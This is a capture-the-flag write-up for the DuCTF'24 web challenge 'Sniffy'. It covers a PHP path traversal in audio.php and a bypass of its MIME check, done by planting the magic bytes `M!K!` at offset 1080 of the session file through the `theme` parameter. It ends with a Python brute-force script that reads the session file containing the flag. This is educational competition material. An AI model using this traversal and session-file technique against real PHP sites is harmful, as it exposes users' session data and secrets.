---
title: "[DuCTF'24] - Sniffy"
date: 2024-07-07T20:31:52+08:00
authors:
- Bowen
tags:
- web
- php
ctfs:
- DuCTF'24
---

# Sniffy

This challenge consisted of a path traversal vulnerability and
something similar to a MIME type confusion attack. While I was
not able to solve this during the CTF due to a skill issue, I
decided to attempt to solve it after the CTF in hopes of being
able to better understand what's going on.

## Description

> Visit our sanctuary to hear the sounds of the Kookaburras!

The source code for the challenge can be obtained from [here](sniffy.zip).

---

## Initial Overview

While clicking around on the page, we see that the page changes
the theme based on a parameter `theme`.

![parameter](parameter.png)

If we see how the theme parameter is handled in the backend, we
can see that it changes the theme if the value is either
`dark` or `light`. However, it defaults to light if the value
is neither, and it takes in any arbitrary value.

```php
function theme() {
    return $_SESSION['theme'] == "dark" ? "dark" : "light";
}

$_SESSION['flag'] = FLAG; /* Flag is in the session here! */
$_SESSION['theme'] = $_GET['theme'] ?? $_SESSION['theme'] ?? 'light';
```

Unfortunately, my dumbass decided to turn a blind eye to this during
the competition, which turned out to be fatal mistake.

## Down the Rabbit Hole

Before we delve any further into how the `theme` parameter can
be exploited, let's take a look at possible ways to find the flag.

There's another file called `audio.php` which seems to be vulnerable
to path traversal attacks. However, it is protected by a MIME type
check.

```php
$file = 'audio/' . $_GET['f'];  // Vulnerable to path traversal (audio/../flag.php)
$mime = mime_content_type($file);  // MIME check

if (!$mime || !str_starts_with($mime, 'audio')) {  // Checks if MIMEtype is an audio
    http_response_code(403); die;
}
```

Initially, I thought that we could somehow bypass the MIME check
and force `audio.php` to view `flag.php`, as the flag was stored there.
However, that would not be possible as we are not able to control `flag.php`,
and thus would not be able to spoof its MIMEtype.

## PHP Sessions

While I was writing this, I realized that the organizers left a really
helpful hint in `index.php`, which was to say that the flag is hidden
in the session.

```php
$_SESSION['flag'] = FLAG; /* Flag is in the session here! */
```

It would have been really nice if I knew of this during the CTF, and
not after, but I found out that PHP's session data is stored on the
filesystem itself, and not as a database that spawns when PHP runs.

Now that I think about it, it certainly makes more sense to place it
as on the filesystem as a persistent file rather than and in-memory
database which is volatile and would lose all information when the
server crashes.

If you'd like to read up more about how PHP determines where the files
are saved, do check this [StackOverflow post](https://stackoverflow.com/questions/454635/where-are-session-variables-stored)
and the [PHP documentation](https://php.net/manual/en/session.configuration.php#ini.session.save-path).

## Putting Two and Two Together

Now that we know PHP session variables are stored as file, and as
the flag is also stored as a session variable as evidenced by
`$_SESSION['flag'] = FLAG;`, we can conclude that the right direction
to go is to somehow spoof the session variable file to act as a
`audio` MIMEtype.

If we look up the documentation for `mime_content_type` [here](https://www.php.net/manual/en/function.mime-content-type.php)
, we see that the MIME content type for a file is given by `magic.mime`.

When we google for `magic.mime`, we see that Apple has kindly
open-sourced their `magic.mime` file which can be found
over [here](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime.auto.html).

After doing a bit of searching, I found out that `magic.mime` is a
file full of byte patterns used to determine a file's MIMEtype.
To illustrate this, if we refer to Apple's `magic.mime` file,
there is one entry that says at offset `1080`, a file
that contains the string `M!K!` will be considered as a `audio/x-mod`.

```txt
# Magic data for KMimeMagic (originally for file(1) command)
#
# The format is 4-5 columns:
#    Column #1: byte number to begin checking from, ">" indicates continuation
#    Column #2: type of data to match
#    Column #3: contents of data to match
#    Column #4: MIME type of result
#    Column #5: MIME encoding of result (optional)

...

1080    string    FLT4       audio/x-mod
```

## Exploitation

Now that we know how to spoof MIMEtypes, let's put it into action.
Firstly, we have to figure out where the PHP session is stored.
The StackOverflow post mentioned above reveals that it is at `/tmp/sess_<ID>`.

Next, we have to somehow inject the string `M!K!` into the file
at offset `1080`. As we do not know how many bytes are written before
the `theme` variable is written into the temp file, we have to brute force
this by adding an arbitrary number of random characters before `M!K!`.

After the string gets injected, we can simply request for the file
and the flag should be inside.

## Script

```py
import requests

s = requests.Session()

for n in range(1000, 1080):  # Brute force offset
    s.get(f"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/?theme={'a'*n + "M!K!"}")  # Insert M!K! after `n` characters

    # Get the contents of the file
    r = s.get(f"https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f=../../../../tmp/sess_{s.cookies['PHPSESSID']}")

    # If we don't get a 403 Unauthorized response, we got the flag
    if (r.status_code != 403):
        print("Offset found:", n)
        print(r.content)
        break
```

Flag: `DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}`
